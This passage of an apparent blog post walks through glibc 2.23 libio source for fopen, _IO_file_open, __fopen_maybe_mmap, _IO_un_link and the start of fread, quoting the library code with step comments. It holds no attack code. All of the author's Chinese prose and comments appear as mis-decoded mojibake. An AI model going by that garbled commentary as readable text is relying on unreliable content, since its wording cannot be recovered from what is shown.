class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-file-fopen"><a href="#IO-file-fopen" class="headerlink" title="_IO_file_fopen"></a>_IO_file_fopen</h2><p>è¿™å…¶å®ä¹Ÿæ˜¯ä¸ªå®å®šä¹‰ï¼Œå®é™…ä¸Šè°ƒç”¨çš„å‡½æ•°æ˜¯_IO_new_file_fopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_file_fopen _IO_file_fopen</span><br></code></pre></td></tr></table></figure><p>_IO_new_file_fopençš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li><p>_IO_file_is_open((fp)-&gt;_fileno !&#x3D; -1)</p><p>åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å·²ç»æ‰“å¼€æ˜¯åˆ™è¿”å›0</p></li><li><p>å¤„ç†æ–‡ä»¶æ¨¡å¼å¹¶å†™å…¥ç»“æ„ä½“</p></li><li><p>è°ƒç”¨_IO_file_openæ‰“å¼€æ–‡ä»¶</p></li><li><p>å¦‚æœæ‰“å¼€æˆåŠŸåˆ™è¿›è¡Œä¸€ï¼ˆmeiï¼‰ç³»ï¼ˆkanï¼‰åˆ—ï¼ˆdongï¼‰è®¾å®š</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_FILE *<br>_IO_new_file_fopen (_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode,<br>    <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> oflags = <span class="hljs-number">0</span>, omode;<br>  <span class="hljs-type">int</span> read_write;<br>  <span class="hljs-type">int</span> oprot = <span class="hljs-number">0666</span>;<br>  <span class="hljs-type">int</span> i;<br>  _IO_FILE *result;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cs;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *last_recognized;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//æ­¥éª¤ä¸€ï¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å·²ç»æ‰“å¼€</span><br>  <span class="hljs-keyword">if</span> (_IO_file_is_open (fp))<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//æ­¥éª¤äºŒï¼šå¤„ç†æ–‡ä»¶æ¨¡å¼å¹¶å†™å…¥_IO_FILEç»“æ„ä½“</span><br>  <span class="hljs-keyword">switch</span> (*mode)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>      omode = O_RDONLY;<br>      read_write = _IO_NO_WRITES;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_TRUNC;<br>      read_write = _IO_NO_READS;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>      omode = O_WRONLY;<br>      oflags = O_CREAT|O_APPEND;<br>      read_write = _IO_NO_READS|_IO_IS_APPENDING;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">7</span>; ++i)<br>    &#123;<br>      <span class="hljs-keyword">switch</span> (*++mode)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\0&#x27;</span>:<br>  <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>  omode = O_RDWR;<br>  read_write &amp;= _IO_IS_APPENDING;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>  oflags |= O_EXCL;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  last_recognized = mode;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;m&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> O_CLOEXEC</span><br>  oflags |= O_CLOEXEC;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;<br>  <span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br>  <span class="hljs-comment">/* Ignore.  */</span><br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br><br><span class="hljs-comment">//æ­¥éª¤ä¸‰ï¼šè°ƒç”¨_IO_file_opwnæ‰“å¼€æ–‡ä»¶</span><br>  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,<br>  is32not64);<br><br><span class="hljs-comment">//æ­¥éª¤å››ï¼šå¦‚æœæ‰“å¼€æˆåŠŸåˆ™è¿›è¡Œä¸€ï¼ˆmeiï¼‰ç³»ï¼ˆkanï¼‰åˆ—ï¼ˆdongï¼‰è®¾å®š</span><br>  <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __ASSUME_O_CLOEXEC</span><br>      <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_CLOEXEC) != <span class="hljs-number">0</span> &amp;&amp; __have_o_cloexec &lt;= <span class="hljs-number">0</span>)<br>&#123;<br>  <span class="hljs-type">int</span> fd = _IO_fileno (fp);<br>  <span class="hljs-keyword">if</span> (__have_o_cloexec == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">int</span> flags = __fcntl (fd, F_GETFD);<br>      __have_o_cloexec = (flags &amp; FD_CLOEXEC) == <span class="hljs-number">0</span> ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (__have_o_cloexec &lt; <span class="hljs-number">0</span>)<br>    __fcntl (fd, F_SETFD, FD_CLOEXEC);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Test whether the mode string specifies the conversion.  */</span><br>      cs = <span class="hljs-built_in">strstr</span> (last_recognized + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;,ccs=&quot;</span>);<br>      <span class="hljs-keyword">if</span> (cs != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-comment">/* Yep.  Load the appropriate conversions and set the orientation</span><br><span class="hljs-comment">     to wide.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gconv_fcts</span> <span class="hljs-title">fcts</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span>;</span><br>  <span class="hljs-type">char</span> *endp = __strchrnul (cs + <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;,&#x27;</span>);<br>  <span class="hljs-type">char</span> *ccs = <span class="hljs-built_in">malloc</span> (endp - (cs + <span class="hljs-number">5</span>) + <span class="hljs-number">3</span>);<br><br>  <span class="hljs-keyword">if</span> (ccs == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-type">int</span> malloc_err = errno;  <span class="hljs-comment">/* Whatever malloc failed with.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      __set_errno (malloc_err);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  *((<span class="hljs-type">char</span> *) __mempcpy (ccs, cs + <span class="hljs-number">5</span>, endp - (cs + <span class="hljs-number">5</span>))) = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  strip (ccs, ccs);<br><br>  <span class="hljs-keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;\0&#x27;</span><br>   ? upstr (ccs, cs + <span class="hljs-number">5</span>) : ccs) != <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Something went wrong, we cannot load the conversion modules.</span><br><span class="hljs-comment"> This means we cannot proceed since the user explicitly asked</span><br><span class="hljs-comment"> for these.  */</span><br>      (<span class="hljs-type">void</span>) _IO_file_close_it (fp);<br>      <span class="hljs-built_in">free</span> (ccs);<br>      __set_errno (EINVAL);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>  <span class="hljs-built_in">free</span> (ccs);<br><br>  assert (fcts.towc_nsteps == <span class="hljs-number">1</span>);<br>  assert (fcts.tomb_nsteps == <span class="hljs-number">1</span>);<br><br>  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;<br>  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;<br><br>  <span class="hljs-comment">/* Clear the state.  We start all over again.  */</span><br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br>  <span class="hljs-built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">__mbstate_t</span>));<br><br>  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;<br><br>  <span class="hljs-comment">/* The functions are always the same.  */</span><br>  *cc = __libio_codecvt;<br><br>  cc-&gt;__cd_in.__cd.__nsteps = fcts.towc_nsteps;<br>  cc-&gt;__cd_in.__cd.__steps = fcts.towc;<br><br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__flags = __GCONV_IS_LAST;<br>  cc-&gt;__cd_in.__cd.__data[<span class="hljs-number">0</span>].__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  cc-&gt;__cd_out.__cd.__nsteps = fcts.tomb_nsteps;<br>  cc-&gt;__cd_out.__cd.__steps = fcts.tomb;<br><br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__invocation_counter = <span class="hljs-number">0</span>;<br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__internal_use = <span class="hljs-number">1</span>;<br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__flags<br>    = __GCONV_IS_LAST | __GCONV_TRANSLIT;<br>  cc-&gt;__cd_out.__cd.__data[<span class="hljs-number">0</span>].__statep =<br>    &amp;result-&gt;_wide_data-&gt;_IO_state;<br><br>  <span class="hljs-comment">/* From now on use the wide character callback functions.  */</span><br>  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;<br><br>  <span class="hljs-comment">/* Set the mode now.  */</span><br>  result-&gt;_mode = <span class="hljs-number">1</span>;<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-file-open"><a href="#IO-file-open" class="headerlink" title="_IO_file_open"></a>_IO_file_open</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br>_IO_FILE *<br>_IO_file_open (_IO_FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> posix_mode, <span class="hljs-type">int</span> prot,<br>       <span class="hljs-type">int</span> read_write, <span class="hljs-type">int</span> is32not64)<br>&#123;<br>  <span class="hljs-type">int</span> fdesc;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))<br>    fdesc = open_not_cancel (filename,<br>     posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br>  <span class="hljs-keyword">else</span><br>    fdesc = open (filename, posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">//è°ƒç”¨ç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶</span><br>  fdesc = open (filename, posix_mode, prot);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (fdesc &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//å°†æ–‡ä»¶æè¿°ç¬¦èµ‹å€¼ç»™_filenoå­—æ®µ</span><br>  fp-&gt;_fileno = fdesc;<br><span class="hljs-comment">//flagå­—æ®µè®¾ç½®</span><br>  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);<br>  <span class="hljs-comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span><br><span class="hljs-comment">     update the offset cache though, since the file handle is not active.  */</span><br><span class="hljs-comment">//å¯¹äºè¿½åŠ æ¨¡å¼ï¼Œå°†æ–‡ä»¶åç§»é‡å‘é€åˆ°æ–‡ä»¶æœ«å°¾</span><br><span class="hljs-comment">//ä½†ä¸æ›´æ–°åç§»ç¼“å­˜ï¼Œå› ä¸ºæ–‡ä»¶å¥æŸ„æœªæ¿€æ´»ï¼ˆç™¾åº¦ç¿»è¯‘ï¼‰</span><br>  <span class="hljs-keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))<br>      == (_IO_IS_APPENDING | _IO_NO_READS))<br>    &#123;<br>      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="hljs-number">0</span>, _IO_seek_end);<br>      <span class="hljs-keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)<br>&#123;<br>  close_not_cancel (fdesc);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>    &#125;<br><span class="hljs-comment">//å†æ¬¡è°ƒç”¨_IO_link_inç¡®ä¿æ–‡ä»¶ç»“æ„ä½“é“¾å…¥</span><br>  _IO_link_in ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fopen-maybe-mmap"><a href="#fopen-maybe-mmap" class="headerlink" title="__fopen_maybe_mmap"></a>__fopen_maybe_mmap</h2><p>å½“æœ‰_G_HAVE_MMAPå®šä¹‰æ—¶ä½¿ç”¨ï¼Œæ ¹æ®è¯»å†™æ¨¡å¼å†³å®šæ“ä½œæ–¹å¼ï¼Ÿæ²¡çœ‹æ‡‚ã€‚æœ€ç»ˆè¿”å›_IO_FILEç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br>_IO_FILE *<br>__fopen_maybe_mmap (_IO_FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _G_HAVE_MMAP</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))<br>    &#123;<br>      <span class="hljs-comment">/* Since this is read-only, we might be able to mmap the contents</span><br><span class="hljs-comment"> directly.  We delay the decision until the first read attempt by</span><br><span class="hljs-comment"> giving it a jump table containing functions that choose mmap or</span><br><span class="hljs-comment"> vanilla file operations and reset the jump table accordingly.  */</span><br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_mode &lt;= <span class="hljs-number">0</span>)<br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;<br>      <span class="hljs-keyword">else</span><br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;<br>      fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-un-link"><a href="#IO-un-link" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_un_link (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br><span class="hljs-comment">//å¦‚æœæ–‡ä»¶ç»“æ„ä½“å·²ç»é“¾å…¥</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> **<span class="hljs-title">f</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (_IO_list_all == <span class="hljs-literal">NULL</span>)<br><span class="hljs-comment">//å¦‚æœ_IO_list_allä¸ºnullï¼Œåˆ™ä¸åšä»»ä½•æ“ä½œ</span><br>;<br><span class="hljs-comment">//å¦‚æœfpå°±æ˜¯å¤´èŠ‚ç‚¹ï¼Œç›´æ¥æ‘˜ä¸‹</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fp == _IO_list_all)<br>&#123;<br>  _IO_list_all = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;<br><span class="hljs-comment">//é€’å¢_IO_list_allå•é“¾è¡¨æ›´æ”¹æ¬¡æ•°</span><br>  ++_IO_list_all_stamp;<br>&#125;<br>      <span class="hljs-keyword">else</span><br><span class="hljs-comment">//å¦‚æœä¸æ˜¯å¤´èŠ‚ç‚¹åˆ™éå†å•é“¾è¡¨æœç´¢å¹¶æ‘˜ä¸‹fd</span><br><span class="hljs-keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)<br>  <span class="hljs-keyword">if</span> (*f == (_IO_FILE *) fp)<br>    &#123;<br>      *f = fp-&gt;file._chain;<br>      ++_IO_list_all_stamp;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">//æ”¹å˜_IO_FILEçš„flagä¸­è¡¨ç¤ºè¿æ¥çš„æ ‡å¿—ä½</span><br>      fp-&gt;file._flags &amp;= ~_IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fread.jpg" class title="fread"><p>æ‰§è¡Œfreadå‡½æ•°æ—¶å®é™…ä¸Šæ‰§è¡Œçš„æ˜¯_IO_freadå‡½æ•°ï¼Œ_IO_freadå‡½æ•°åˆè°ƒç”¨äº†_IO_sgetnå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofread.c</span><br><br>_IO_size_t<br>_IO_fread (<span class="hljs-type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t bytes_requested = size * count;<br>  _IO_size_t bytes_read;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (bytes_requested == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) 